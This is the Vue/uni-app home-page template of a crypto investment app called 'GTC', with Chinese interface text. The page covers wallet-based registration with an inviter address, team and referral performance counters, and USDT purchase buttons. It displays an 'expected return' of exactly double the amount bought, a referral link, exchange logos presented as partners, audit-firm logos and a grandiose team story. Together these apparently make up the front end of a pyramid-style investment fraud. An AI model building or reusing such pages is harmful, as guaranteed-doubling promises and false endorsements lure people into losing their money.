<template>
  <tm-app ref="app" darkColor="#000" :bgImg="bgimg" style="  background-size: cover;background-repeat: no-repeat;" >
    <!-- 顶部导航 -->
    <tm-navbar :title="''"  :height="50" :shadow="1" hide-home  :followTheme="true"  color="#181940" >
      <template v-slot:left>
        <view class="flex flex-center flex-row">
          <view class="mx-20">
            <tm-image src="/static/home/logo.8f451d87.png"  :width="60" :height="60"></tm-image>
          </view>
          <view>
            <tm-text class="text-weight-b">GTC</tm-text>
<!--            <tm-image src="/static/home/soll.7664f7cf.svg"  :width="260" :height="80"></tm-image>-->
          </view>

        </view>
      </template>
      <template v-slot:right>
        <view class="flex flex-center flex-row mr-20">
<!-- <view class="mr-10"><tm-text >{{store.tmStore.userInfo.wallet.address.substring(0,6)+'...'+store.tmStore.userInfo.wallet.address.slice(-6) }}</tm-text></view> -->
          <view @click=""  class="">
            <tm-button style="width: 150px;height: 35px; box-shadow: inset 0 0 8px 0 #6158ff;border: 1px solid #706da5;background: linear-gradient(0deg,#100842,#100842),linear-gradient(0deg,#706da5,#706da5);"
                       :block='true' @click="" :round="10" size="normal" >{{ store.tmStore.userInfo.wallet.address.substring(0,6) +'...'+ store.tmStore.userInfo.wallet.address.slice(-6) }}
            </tm-button>
          </view>
          <tm-icon @click="toggleDrawer" :color="store.tmStore.dark?'white':''" _class="pl-15"  :font-size="40" name="tmicon-menu"></tm-icon>
        </view>
      </template>
    </tm-navbar>
    <view class="relative ">
      <view class="absolute flex-center" style="width:208px;height: 208px;top:50%;left:50%;border-radius: 999px;overflow: hidden;transform: translate(-50%,-50%) scaleX(1) scaleY(1) ">
        <video :src="globviedo" autoplay loop muted :show-play-btn="false" :controls="false" objectFit="cover"></video>

<!--        <video :src="globviedo" autoplay="true"  loop="true" muted="true" controls="false" show-fullscreen-btn="false" show-progress="false" show-play-btn="false"  enable-progress-gesture="false" playsinline></video>-->
      </view>


      <view class="flex-center" style="">
        <image  class="loader"  :src="roundimg"></image>
      </view>
    </view>

    <view style="transform: translateY(-10px);" >
<!--      <tm-roll-notice :round="4" color="#21234a" fontColor="white" icon=""  @click="" list="GTC震撼上线"></tm-roll-notice>-->
      <tm-alert color="blue" :duration="5000" :closable="false" fontColor="white" :autoPlay="true" text :border="0" :content="content" :height="80"></tm-alert>
      <view v-show="!isLogin">
        <view class="mx-n10  flex flex-between">
          <tm-text class="text-black text-weight-b my-20" _style="font-size: 14px;">丨注册中心</tm-text>
        </view>
        <view class=" flex-row-center-center mt-20">
          <view class=" colorline " ></view>
        </view>
        <tm-sheet darkBgColor="#391c8c66" style="border-width: 1px;border-color: #fff3;" class="" :round="4" :margin="[20,0]">
          <view class="flex-center">
            <view class="inputshadow my-25 pa-20">
              <view class="flex flex-row-center-between mt-20">
                <view class="flex flex-row-center-start ml-20">
                  <tm-text :fontSize="24" color="grey-1" class="text-weight-b">我的地址 :</tm-text>
                  <tm-text :fontSize="24"  class=" ml-25">{{trimAddress(store.tmStore.userInfo.wallet.address,12) }}</tm-text>
                </view>
              </view>
              <view class="flex flex-row-center-start ml-20">
                <tm-text :fontSize="24" color="grey-1" class="text-weight-b">邀请地址 :</tm-text>
                <tm-input transprent :round="4" :width="450" :height="80" placeholder="邀请地址"  focusColor="white"  :borderRadius="4" :fontSize="25" type="text" v-model="trimmedInviteUrl" ></tm-input>
              </view>
              <view class="flex flex-row-center-between ">
                <view class="flex flex-row-center-start ml-20">
                  <tm-text :fontSize="24" color="grey-1" class="text-weight-b">注册地区 :</tm-text>
                  <tm-text :fontSize="24" color="grey-1" class="text-weight-b ml-25">{{userinfo.loadaddr}}</tm-text>
                </view>
              </view>
              <view class="flex flex-row-center-between ">
                <view class="flex flex-row-center-start ml-20">
                  <tm-text :fontSize="24" color="grey-1" class="text-weight-b">用户昵称 :</tm-text>
                  <tm-input transprent :round="4" :width="200" :height="80" placeholder="用户昵称"  focusColor="white"  :borderRadius="4" :fontSize="25" type="text" v-model="uniqueNickname" ></tm-input>
                </view>
                <tm-button :round="4" :width="150" :height="60" :fontSize="25" color="white" style="border: rgba(143,136,136,0.66) solid 1px;margin-right: 15rpx"  @click="generateUniqueNickname() " transprent>
                  <tm-image :width="38" :height="38" :src="exsvg" style="margin:10rpx"></tm-image>
                  <tm-text :fontSize="24" color="grey-1">换一个</tm-text>
                </tm-button>
              </view>
              <view class="flex flex-row-center-between ">
                <view class="flex flex-row-center-start ml-20">
                  <view>
                    <tm-text :fontSize="24" color="grey-1" class="text-weight-b">用户头像 :</tm-text>
                  </view>
                  <view class="ml-10">
                    <tm-image :round="25" :width="100" :height="100" :src="userinfo.avatarurl" style="margin:10rpx"></tm-image>
                  </view>
                </view>
                <tm-button :round="4" :width="150" :height="60" :fontSize="25" color="white" style="border: rgba(143,136,136,0.66) solid 1px;margin-right: 15rpx"  @click="saveImageAsBase64() " transprent>
                  <tm-image :width="38" :height="38" :src="exsvg" style="margin:10rpx"></tm-image>
                  <tm-text :fontSize="24" color="grey-1">换一个</tm-text>
                </tm-button>
              </view>
            </view>
          </view>
          <view class="flex-center mb-10 mt-10">
            <tm-button @click="throttle(usdtApprove, 5000,true)" :width="600" :height="80" :fontSize="28"   style="background-color: rgb(104 34 227)">立 即 注 册 </tm-button>
  <!--          <tm-button class="btncolor" :round="4" :width="500" :height="60" :fontSize="25" color="grey" style="margin-bottom: 20rpx" @click="throttle(usdtApprove, 5000,true)">-->
  <!--            <tm-text color="black" class="text-weight-b"> 立 即 注 册 </tm-text>-->
  <!--          </tm-button>-->
          </view>
        </tm-sheet>
      </view>

      <view v-show="isLogin">
        <view class="flex-center mb--n10" style="">
          <tm-text :fontSize="24" class="round-4 border-a-1-bk px-10 py-5 flex-center" style="width: 160px">个 人 中 心</tm-text>
        </view>
        <tm-sheet transprent class=" " style="background-image: url('../../static/home/home_bg_2.svg');background-size: cover;background-repeat: no-repeat;"   :margin="[20,20]" >
          <!--        <image :src="homebg2"  style="width: 100%;height: 590rpx; position: absolute;left: 0;top: 0" ></image>-->
          <view class="flex flex-row-center-between ma-10">
            <view class="flex-start pa-10">
              <image :src="store.tmStore.userInfo.cliUser?.avatarurl" style="border-radius: 50%;width: 120rpx;height: 120rpx"></image>
              <view class="mt-10 ml-20" >
                <tm-text class="mr-20 text-size-l ">{{store.tmStore.userInfo.cliUser?.nickname}}</tm-text>
                <tm-text :fontSize="26" class="mr-20 mt-15  ">{{ store.tmStore.userInfo.wallet?.usdt }} U</tm-text>
              </view>
            </view>
            <view class="relative">
              <image class="loader relative" :src="border1" style="width: 150rpx; height: 150rpx"></image>
              <tm-text class="text-center " :fontSize="26">1 天</tm-text>
            </view>
          </view>
          <view  class="  mt-20 mb-18">
            <view class=" flex-row-center-between px-10">
              <view class="">
                <view class=" pa-20 round-4 " style="background-color: rgba(182,199,218,0.2);width: 260rpx">
                  <view class="flex-center  ">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M9.02781 5.55547H7.02531C6.19828 5.55547 5.52531 6.22843 5.52531 7.05547V9.05781C5.52531 9.88484 6.19828 10.5578 7.02531 10.5578H9.02766C9.85469 10.5578 10.5277 9.88484 10.5277 9.05781V7.05547C10.5278 6.22843 9.85485 5.55547 9.02781 5.55547ZM9.52781 9.05781C9.52781 9.33343 9.30344 9.55781 9.02781 9.55781H7.02531C6.74953 9.55781 6.52531 9.33343 6.52531 9.05781V7.05547C6.52531 6.77968 6.74953 6.55547 7.02531 6.55547H9.02766C9.30328 6.55547 9.52766 6.77968 9.52766 7.05547V9.05781H9.52781Z" fill="white"></path><path d="M14.4895 8.5489C14.7656 8.5489 14.9895 8.32499 14.9895 8.0489C14.9895 7.77281 14.7656 7.5489 14.4895 7.5489H13.5139V5.54999H14.4895C14.7656 5.54999 14.9895 5.32609 14.9895 5.04999C14.9895 4.7739 14.7656 4.54999 14.4895 4.54999H13.4837C13.3222 3.54328 12.5259 2.74609 11.5198 2.58328V1.58031C11.5198 1.30421 11.2959 1.08031 11.0198 1.08031C10.7437 1.08031 10.5198 1.30421 10.5198 1.58031V2.55249H8.52093V1.58031C8.52093 1.30421 8.29703 1.08031 8.02093 1.08031C7.74484 1.08031 7.52093 1.30421 7.52093 1.58031V2.55249H5.51874V1.58031C5.51874 1.30421 5.29484 1.08031 5.01874 1.08031C4.74265 1.08031 4.51874 1.30421 4.51874 1.58031V2.58281C3.51156 2.74484 2.71421 3.54249 2.55265 4.54999H1.54906C1.27296 4.54999 1.04906 4.7739 1.04906 5.04999C1.04906 5.32609 1.27296 5.54999 1.54906 5.54999H2.52249V7.5489H1.54906C1.27296 7.5489 1.04906 7.77281 1.04906 8.0489C1.04906 8.32499 1.27296 8.5489 1.54906 8.5489H2.52249V10.5511H1.54906C1.27296 10.5511 1.04906 10.775 1.04906 11.0511C1.04906 11.3272 1.27296 11.5511 1.54906 11.5511H2.55343C2.71671 12.5564 3.51312 13.3519 4.5189 13.5137V14.5209C4.5189 14.797 4.74281 15.0209 5.0189 15.0209C5.29499 15.0209 5.5189 14.797 5.5189 14.5209V13.5442H7.52109V14.5209C7.52109 14.797 7.74499 15.0209 8.02109 15.0209C8.29718 15.0209 8.52109 14.797 8.52109 14.5209V13.5442H10.52V14.5209C10.52 14.797 10.7439 15.0209 11.02 15.0209C11.2961 15.0209 11.52 14.797 11.52 14.5209V13.5134C12.5247 13.3508 13.32 12.5558 13.4831 11.5512H14.4897C14.7658 11.5512 14.9897 11.3273 14.9897 11.0512C14.9897 10.7752 14.7658 10.5512 14.4897 10.5512H13.5141V8.5489H14.4895ZM12.5139 11.1691C12.5139 11.9272 11.897 12.5441 11.1389 12.5441H4.89749C4.13937 12.5441 3.52249 11.9272 3.52249 11.1691V4.92749C3.52249 4.16937 4.13937 3.55249 4.89749 3.55249H11.1391C11.8972 3.55249 12.5141 4.16937 12.5141 4.92749V11.1691H12.5139Z" fill="white"></path></svg>
                    <tm-text class="ml-5" :fontSize="22" color="white">个人业绩</tm-text>
                  </view>
                  <view class="flex-center  ">
                    <tm-text>{{ store.tmStore.userInfo.mainorder?.descnum }}</tm-text>
                  </view>
                </view>
                <view class=" mt-25 pa-20 round-4" style="background-color: rgba(182,199,218,0.2);width: 260rpx">
                  <view class="flex-center  ">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M14.417 12.666H12.084C11.9293 12.6657 11.781 12.6041 11.6717 12.4946C11.5624 12.3851 11.501 12.2367 11.501 12.082L11.5 11.5H10.722V12.667H9.556V11.5H8.778V12.667H7.222V11.5H6.445V12.667H5.278V11.5H4.5L4.496 12.082C4.49613 12.1586 4.48115 12.2346 4.45191 12.3054C4.42267 12.3763 4.37975 12.4406 4.3256 12.4949C4.27145 12.5491 4.20714 12.5922 4.13634 12.6215C4.06554 12.6509 3.98965 12.666 3.913 12.666H1.583C1.50636 12.666 1.43046 12.6509 1.35967 12.6215C1.28887 12.5922 1.22455 12.5491 1.1704 12.4949C1.11625 12.4406 1.07333 12.3763 1.04409 12.3054C1.01485 12.2346 0.999869 12.1586 1 12.082V3.918C1 3.595 1.261 3.334 1.583 3.334H14.416C14.4927 3.33387 14.5687 3.34888 14.6396 3.37819C14.7106 3.40749 14.775 3.4505 14.8292 3.50476C14.8835 3.55901 14.9265 3.62344 14.9558 3.69436C14.9851 3.76527 15.0001 3.84127 15 3.918V12.082C15.0001 12.1586 14.9852 12.2346 14.9559 12.3054C14.9267 12.3763 14.8837 12.4406 14.8296 12.4949C14.7755 12.5491 14.7111 12.5922 14.6403 12.6215C14.5695 12.6509 14.4936 12.666 14.417 12.666ZM13.833 9.895H13.221C13.0661 9.895 12.9176 9.83347 12.8081 9.72395C12.6985 9.61443 12.637 9.46589 12.637 9.311C12.637 9.15611 12.6985 9.00757 12.8081 8.89805C12.9176 8.78853 13.0661 8.727 13.221 8.727H13.833V4.502H2.167V8.727H2.76C2.91489 8.727 3.06343 8.78853 3.17295 8.89805C3.28247 9.00757 3.344 9.15611 3.344 9.311C3.344 9.46589 3.28247 9.61443 3.17295 9.72395C3.06343 9.83347 2.91489 9.895 2.76 9.895H2.167V11.497H3.33L3.334 10.722C3.334 10.399 3.401 10.333 3.723 10.333H12.279C12.601 10.333 12.668 10.399 12.668 10.722V11.497H13.834V9.895H13.833ZM11.5 5.278H12.667V8H11.5V5.278ZM8.778 5.278H9.945V8H8.778V5.278ZM6.056 5.278H7.223V8H6.056V5.278ZM3.333 5.278H4.5V8L3.352 7.998L3.333 5.278Z" fill="white"></path></svg>
                    <tm-text class="ml-5" :fontSize="22" color="white">直推成员</tm-text>
                  </view>
                  <view class="flex-center ">
                    <tm-text>{{ store.tmStore.userInfo.cliUser.pullnum }}</tm-text>
                  </view>
                </view>
              </view>
              <view class=" ">
                <view class="pa-20 round-4" style="background-color: rgba(182,199,218,0.2);width: 260rpx">
                  <view class="flex-center  ">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M11.248 2.39999C11.6107 2.39999 11.888 2.45066 12.08 2.55199C12.272 2.65333 12.4373 2.84799 12.576 3.13599C12.6293 3.25333 12.7147 3.43466 12.832 3.67999C12.9493 3.92533 13.0827 4.20266 13.232 4.51199C13.3813 4.82133 13.536 5.14933 13.696 5.49599C13.856 5.84266 14.008 6.17066 14.152 6.47999C14.296 6.78933 14.424 7.06399 14.536 7.30399C14.648 7.54399 14.7253 7.71733 14.768 7.82399C14.8213 7.94133 14.8667 8.02933 14.904 8.08799C14.9413 8.14666 14.9733 8.21066 15 8.27999C15.0267 8.34933 15.0453 8.43199 15.056 8.52799C15.0667 8.62399 15.072 8.75733 15.072 8.928C15.072 9.05599 15.0693 9.25333 15.064 9.52C15.0587 9.78666 15.056 10.0693 15.056 10.368V11.264V11.888C15.056 12.1867 14.968 12.44 14.792 12.648C14.616 12.856 14.3627 12.96 14.032 12.96H1.744C1.43466 12.96 1.2 12.8613 1.04 12.664C0.879997 12.4667 0.794663 12.2133 0.783997 11.904V11.344C0.783997 11.0987 0.786663 10.8373 0.791997 10.56C0.79733 10.2827 0.799997 10.0053 0.799997 9.72799V9.05599C0.799997 8.87466 0.802663 8.73066 0.807997 8.62399C0.81333 8.51733 0.826663 8.42399 0.847997 8.34399C0.86933 8.26399 0.89333 8.18133 0.919997 8.09599C0.946663 8.01066 0.986663 7.90399 1.04 7.77599C1.072 7.69066 1.14133 7.52799 1.248 7.28799C1.35466 7.04799 1.48266 6.77333 1.632 6.46399C1.78133 6.15466 1.944 5.82399 2.12 5.47199C2.296 5.11999 2.46133 4.78666 2.616 4.47199C2.77066 4.15733 2.912 3.87733 3.04 3.63199L3.296 3.10399C3.43466 2.82666 3.60533 2.63999 3.808 2.54399C4.01066 2.44799 4.25066 2.39999 4.528 2.39999H11.248ZM14.016 9.21599C14.016 8.89599 13.8667 8.73599 13.568 8.73599L2.24 8.75199C2.05866 8.75199 1.92 8.80266 1.824 8.904C1.728 9.00533 1.68 9.13599 1.68 9.29599V11.568C1.68 11.696 1.71466 11.8027 1.784 11.888C1.85333 11.9733 1.96266 12.016 2.112 12.016L13.504 12.032C13.7173 12.032 13.856 11.9813 13.92 11.88C13.984 11.7787 14.016 11.6533 14.016 11.504V9.21599ZM4.592 3.23199C4.44266 3.23199 4.31733 3.28266 4.216 3.38399C4.11466 3.48533 4.064 3.61066 4.064 3.75999C4.064 3.90933 4.11466 4.03466 4.216 4.13599C4.31733 4.23733 4.44266 4.28799 4.592 4.28799C4.74133 4.28799 4.864 4.23733 4.96 4.13599C5.056 4.03466 5.104 3.90933 5.104 3.75999C5.104 3.61066 5.056 3.48533 4.96 3.38399C4.864 3.28266 4.74133 3.23199 4.592 3.23199ZM3.36 6.11199C3.21066 6.11199 3.08533 6.16266 2.984 6.26399C2.88266 6.36533 2.832 6.49066 2.832 6.63999C2.832 6.78933 2.88266 6.91466 2.984 7.01599C3.08533 7.11733 3.21066 7.16799 3.36 7.16799C3.50933 7.16799 3.63466 7.11733 3.736 7.01599C3.83733 6.91466 3.888 6.78933 3.888 6.63999C3.888 6.49066 3.83733 6.36533 3.736 6.26399C3.63466 6.16266 3.50933 6.11199 3.36 6.11199ZM10.72 3.75999C10.72 3.90933 10.768 4.03466 10.864 4.13599C10.96 4.23733 11.0827 4.28799 11.232 4.28799C11.3813 4.28799 11.5067 4.23733 11.608 4.13599C11.7093 4.03466 11.76 3.90933 11.76 3.75999C11.76 3.61066 11.7093 3.48533 11.608 3.38399C11.5067 3.28266 11.3813 3.23199 11.232 3.23199C11.0827 3.23199 10.96 3.28266 10.864 3.38399C10.768 3.48533 10.72 3.61066 10.72 3.75999ZM11.936 6.63999C11.936 6.78933 11.9867 6.91466 12.088 7.01599C12.1893 7.11733 12.3147 7.16799 12.464 7.16799C12.6133 7.16799 12.736 7.11733 12.832 7.01599C12.928 6.91466 12.976 6.78933 12.976 6.63999C12.976 6.49066 12.928 6.36533 12.832 6.26399C12.736 6.16266 12.6133 6.11199 12.464 6.11199C12.3147 6.11199 12.1893 6.16266 12.088 6.26399C11.9867 6.36533 11.936 6.49066 11.936 6.63999ZM3.648 11.568H3.168V9.29599H3.648V11.568ZM5.104 11.568H4.624V9.29599H5.104V11.568ZM6.576 11.568H6.096V9.29599H6.576V11.568ZM8.032 11.568H7.552V9.29599H8.032V11.568ZM9.536 11.568H9.056V9.29599H9.536V11.568ZM11.024 11.568H10.544V9.29599H11.024V11.568ZM12.432 11.568H11.952V9.29599H12.432V11.568Z" fill="white"></path></svg>
                    <tm-text  class="ml-5"  :fontSize="22" color="white">团队业绩</tm-text>
                  </view>
                  <view class="flex-center  ">
                    <tm-text>{{ store.tmStore.userInfo.mainorder?.amount }}</tm-text>
                  </view>
                </view>
                <view class=" mt-25 round-4 pa-20" style="background-color: rgba(182,199,218,0.2);width: 260rpx">
                  <view class="flex-center  ">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8 13.395C8.25938 13.395 8.50814 13.2919 8.69155 13.1085C8.87496 12.9251 8.978 12.6764 8.978 12.417C8.978 12.1576 8.87496 11.9088 8.69155 11.7254C8.50814 11.542 8.25938 11.439 8 11.439C7.74062 11.439 7.49186 11.542 7.30845 11.7254C7.12504 11.9088 7.022 12.1576 7.022 12.417C7.022 12.6764 7.12504 12.9251 7.30845 13.1085C7.49186 13.2919 7.74062 13.395 8 13.395ZM10.273 10.73C10.0921 10.7236 9.9192 10.6543 9.784 10.534C9.29413 10.0932 8.65847 9.84937 7.9995 9.84937C7.34053 9.84937 6.70487 10.0932 6.215 10.534C6.0719 10.6624 5.88398 10.7292 5.69194 10.7201C5.4999 10.7109 5.31921 10.6264 5.189 10.485C5.0606 10.3419 4.99375 10.154 5.00292 9.96193C5.01209 9.76989 5.09655 9.5892 5.238 9.45899C5.99215 8.7714 6.97465 8.38818 7.99519 8.38356C9.01573 8.37894 10.0017 8.75325 10.762 9.43399C10.9037 9.56424 10.9884 9.74514 10.9976 9.93742C11.0067 10.1297 10.9397 10.3178 10.811 10.461C10.746 10.542 10.6643 10.6079 10.5714 10.6544C10.4786 10.7008 10.3768 10.7266 10.273 10.73Z" fill="white"></path><path d="M12.327 8.67699C12.1385 8.6712 11.9575 8.60217 11.813 8.48099C10.7811 7.50902 9.41757 6.9669 8 6.96499C6.58156 6.96232 5.21638 7.5051 4.187 8.48099C3.893 8.74999 3.429 8.74999 3.16 8.45699C2.867 8.13899 2.867 7.67399 3.16 7.40499C4.46804 6.17076 6.20162 5.48843 8 5.49999C9.79636 5.50017 11.5259 6.18126 12.84 7.40599C12.9111 7.47057 12.9684 7.54894 13.0083 7.63632C13.0482 7.72371 13.07 7.8183 13.0722 7.91435C13.0745 8.01039 13.0572 8.10589 13.0214 8.19505C12.9856 8.28421 12.932 8.36516 12.864 8.43299C12.7237 8.58141 12.5311 8.66929 12.327 8.67799V8.67699Z" fill="white"></path><path d="M14.6 6.403C14.4116 6.3975 14.2306 6.32882 14.086 6.208C12.4565 4.62337 10.273 3.73717 8 3.738C5.73192 3.73909 3.55163 4.61486 1.913 6.183C1.84434 6.25263 1.76253 6.30793 1.67232 6.34567C1.5821 6.38341 1.48529 6.40284 1.3875 6.40284C1.28971 6.40284 1.1929 6.38341 1.10269 6.34567C1.01247 6.30793 0.93066 6.25263 0.862001 6.183C0.593001 5.89 0.593001 5.426 0.886001 5.157C2.817 3.299 5.336 2.272 8 2.272C10.664 2.272 13.182 3.299 15.113 5.132C15.406 5.402 15.406 5.866 15.137 6.159C15.071 6.23667 14.9886 6.29881 14.8958 6.34099C14.8029 6.38316 14.702 6.40434 14.6 6.403Z" fill="white"></path></svg>
                    <tm-text  class="ml-5"  :fontSize="22" color="white">团队成员</tm-text>
                  </view>
                  <view class="flex-center  ">
                    <tm-text>{{ store.tmStore.userInfo.cliUser.teamnum }}</tm-text>
                  </view>
                </view>
              </view>
            </view>

          </view>


        </tm-sheet>
      </view>
      <tm-text class="text-black text-weight-b my-40 ml-20" _style="font-size: 14px;">丨金融中心</tm-text>
      <tm-sheet class="relative " darkBgColor="#4b21e5" style="background: linear-gradient(107deg,#4853ef,#5d7dff);" :round="4" :margin="[20,20]">

        <!--        <image :src="homebgimg"  style="width: 100%;height: 590rpx; position: absolute;left: 0;top: 0" ></image>-->
        <view class="flex flex-row-center-between  zIndex-1">
          <view class="topshow">
            <view class="flex flex-row-center-between ma-10">
              <view>
                <view class="flex-start ">
                  <tm-icon name="tmicon-gift" :font-size="26"  color="white" _class="mr-10"></tm-icon>
                  <tm-text :fontSize="30" color="white">买入份额 :</tm-text>
                  <tm-text :fontSize="30"  color="" class="ml-10">{{ buyamount }}</tm-text>
                </view>
                <view class="flex-start my-10 ">
                  <tm-icon name="tmicon-qiandai" :font-size="26"  color="white" _class="mr-10"></tm-icon>
                  <tm-text :fontSize="30" color="" class="">预期收益 :</tm-text>
                  <tm-text :fontSize="30" color="" class="ml-10">{{ 2*buyamount }}</tm-text>
                </view>
                <view class="flex-start ">
                  <tm-icon name="tmicon-meiyuan" :font-size="26"  color="white" _class="mr-10"></tm-icon>
                  <tm-text :fontSize="30" color="" class="">钱包余额 : </tm-text>
                  <tm-text :fontSize="30" color="" class="ml-10">{{ store.tmStore.userInfo.wallet.usdt }}</tm-text>
                </view>
              </view>

              <view class="absolute" style="right:20px;top:20px">
                <image class=" relative" :src="usdtimg" style="width: 100rpx; height: 100rpx"></image>
              </view>
            </view>
          </view>
        </view>
        <view class="mt-20">
          <view class="flex flex-between" >
            <tm-button  @click="buybtn(10)"  style="background-color: rgb(0 0 0 / 40%)">10</tm-button>
            <tm-button @click="buybtn(100)"  style="background-color: rgb(0 0 0 / 40%);margin-right: 5px;margin-left: 5px">100</tm-button>
            <tm-button @click="buybtn(500)" style="background-color: rgb(0 0 0 / 40%)">500</tm-button>
          </view>
          <view class="flex flex-between">
            <tm-button @click="buybtn(1000)"  style="background-color: rgb(0 0 0 / 40%)">1000</tm-button>
            <tm-button @click="buybtn(5000)"  style="background-color: rgb(0 0 0 / 40%);margin-right: 5px;margin-left: 5px">5000</tm-button>
            <tm-button @click="buybtn(10000)" style="background-color: rgb(0 0 0 / 40%)">10000</tm-button>
          </view>
        </view>
        <view class="mt-20">
          <tm-button @click="throttle(getUpTree,5000)"  block style="background-color: rgb(104,34,227)"> 立 即 认 购</tm-button>
        </view>
      </tm-sheet>

      <tm-sheet class="relative " darkBgColor="#4b21e5" style="background: linear-gradient(to right, rgb(71, 14, 255) 0%, rgba(255,33,219,0.78) 100%);" :round="4" :margin="[20,20]">
<!--        <image :src="homebgimg"  style="width: 100%;height: 590rpx; position: absolute;left: 0;top: 0" ></image>-->
        <view class="flex flex-row-center-between  zIndex-1">
          <view class="topshow mx-30">
            <view class="flex flex-row-center-between ma-10">
              <view class="mt-n10">
                <tm-text :fontSize="30" color="white">丨邀请链接</tm-text>
<!--                <tm-text color="grey" class="mt-10 ml-25">我的链接</tm-text>-->
              </view>
              <view class="absolute" style="right:20px;top:20px">
                <image class=" relative" :src="homebg3" style="width: 100rpx; height: 100rpx"></image>
              </view>
            </view>

          </view>
        </view>
        <view style="background-color: rgb(0 0 0 / 40%)" class="mt-n10 pa-20 round-4">
          <view class="ma-20" @click="">

            <tm-text :label="'https://osl.fund?id='+trimAddress(store.tmStore.userInfo.wallet?.address,12)" color="grey-1" class="text-weight-b"></tm-text>
          </view>
          <view class="mt-20">
            <tm-button @click="copyInviteUrl"  block style="background-color: rgb(104 34 227)">复 制 链 接</tm-button>
          </view>
        </view>

      </tm-sheet>

      <!--平台特色 -->
      <tm-sheet :margin="[20,25]" :padding="[20,10]"  :text="true"  :round="3"  class="zIndex-1" transprent>
        <tm-text class="text-black text-weight-b my-40" _style="font-size: 14px;">丨平台特色</tm-text>
<!--                <img src="https://tool.lu/netcard/" alt="">-->


                <tm-grid :width="675" :col="2"   transprent>
                  <tm-grid-item :height="350" >
                    <tm-image  :width="250" :height="250" src="/static/nft/nft2.webp"> </tm-image>
                    <tm-text _class="pt-10" :fontSize="30" label="超强算力"></tm-text>
                  </tm-grid-item>
                  <tm-grid-item  :height="350" >
                    <tm-image  :width="250" :height="250" src="/static/nft/nft1.webp"> </tm-image>
                    <tm-text _class="pt-10" :fontSize="30" label="奖励丰富"></tm-text>
                  </tm-grid-item>
                  <tm-grid-item  :height="350" >
                    <tm-image  :width="250" :height="250" src="/static/nft/nft5.webp"> </tm-image>
                    <tm-text :fontSize="30" label="安全加密"></tm-text>
                  </tm-grid-item>
                  <tm-grid-item  :height="350" >
                    <tm-image  :width="250" :height="250" src="/static/nft/nft4.webp"> </tm-image>
                    <tm-text _class="pt-10 " :fontSize="30"  label="资源链接"></tm-text>
                  </tm-grid-item>
                </tm-grid>
      </tm-sheet>
            <!-- 审计机构 -->
            <tm-sheet :margin="[20,10]" :padding="[20,20]" text  :round="3" transprent>
              <view class="text-align-center mb-20">
                <tm-text class="text-black text-weight-b" _style="font-size: 14px;">丨审计机构</tm-text>
              </view>

              <view class="flex-center ma-10  ">
                <view class=" ">
                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
                      display: inline-block;}"  class="" src="@/static/shenji/shenji1.png" alt=""/>
                </view>
                <view class=" mx-15">
                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
                      display: inline-block;}"  class="" src="@/static/shenji/shenji2.png" alt=""/>
                </view>
                <view class=" ">
                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
                      display: inline-block;}"  class="" src="@/static/shenji/shenji3.png" alt=""/>
                </view>
              </view>

            </tm-sheet>
            <!-- 合作伙伴 -->
            <tm-sheet :margin="[20,10]" :padding="[20,20]" text  :round="3" transprent>
              <view class=" mb-20">
                <tm-text class="text-white text-weight-b" _style="font-size: 14px;">丨合作伙伴</tm-text>
              </view>

              <view class="flex flex-center ">
                <view class="">
                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
      								display: inline-block;}"  class="" src="@/static/homedown/huobi.png" alt=""/>
                </view>
                <view class=" ma-10">
                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
      								display: inline-block;}"  class="" src="@/static/homedown/geoko.png" alt=""/>
                </view>
                <view class="">
                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
      								display: inline-block;}"  class="" src="@/static/homedown/binace.png" alt=""/>
                </view>
              </view>
              <view class="flex-center  ">
                <view class="">
                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
      								display: inline-block;}"  class="" src="@/static/homedown/defi.png" alt=""/>
                </view>
                <view class="ma-10">
                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
      								display: inline-block;}"  class="" src="@/static/homedown/coinbase.png" alt=""/>
                </view>
                <view class="">
                  <img style="width: 100%;height: 100%;background-repeat: no-repeat;background-size: 100% 100%;
      								display: inline-block;}"  class="" src="@/static/homedown/tp.png" alt=""/>
                </view>
              </view>
            </tm-sheet>
      <!-- 首页数据展示五区 -->
      <tm-sheet :margin="[20,10]" :padding="[20,20]" text transprent  :round="3" >

        <view class="text-align-center mt-20 mb-40">
          <tm-text class="text-black text-weight-b" _style="font-size: 14px;">丨团队风采</tm-text>
        </view>

                <tm-text class=" mb-20 text-size-s">在全球经济的风云变幻中，维塔斯宛如一颗耀眼的明星，在国际金融舞台上绽放出璀璨光芒。

                  起源于神秘而广袤的俄罗斯大地，维塔斯从诞生之日起就承载着非凡的使命。它汇聚了全球顶尖的金融精英，他们以卓越的智慧和敏锐的洞察力，在复杂的市场中精准地捕捉每一个投资机遇。
                </tm-text>
        <img src="@/static/homedown/openai1.webp" style="width: 100%" alt=""/>

      </tm-sheet>

    </view>
    <draw :showleft="showdraw"  @closedraw="handleClosedraw"></draw>
  </tm-app>
</template>
<script lang="ts" setup>
	import { ref,computed } from "vue"
  import {throttle} from "@/tmui/tool/function/util";
  import exsvg from '@/static/home/exsvg.svg'
  import btnimg from '@/static/btn/btn-recharge.png'
  import usdtimg from '@/static/home/usdtlogo.png'
  import bgimg from "@/static/home/home-bg.png"
  import roundimg from "@/static/home/borderound.svg"
  import globviedo from "@/static/home/global.mp4"
  import homecoin from '@/static/home/home_coin.svg'
  import homebgimg from "@/static/home/home_bg_5.png"
  import home30 from "@/static/home/home_30.svg"
  import border1 from '@/static/home/border1.svg'
  import homebg3 from '@/static/home/home_bg_3.svg'
  import { useTmpiniaStore } from '@/tmui/tool/lib/tmpinia'
  import {onLoad, onShow} from "@dcloudio/uni-app";
  import {buyApi, getSettingApi, loginApi, registerApi} from "@/api";
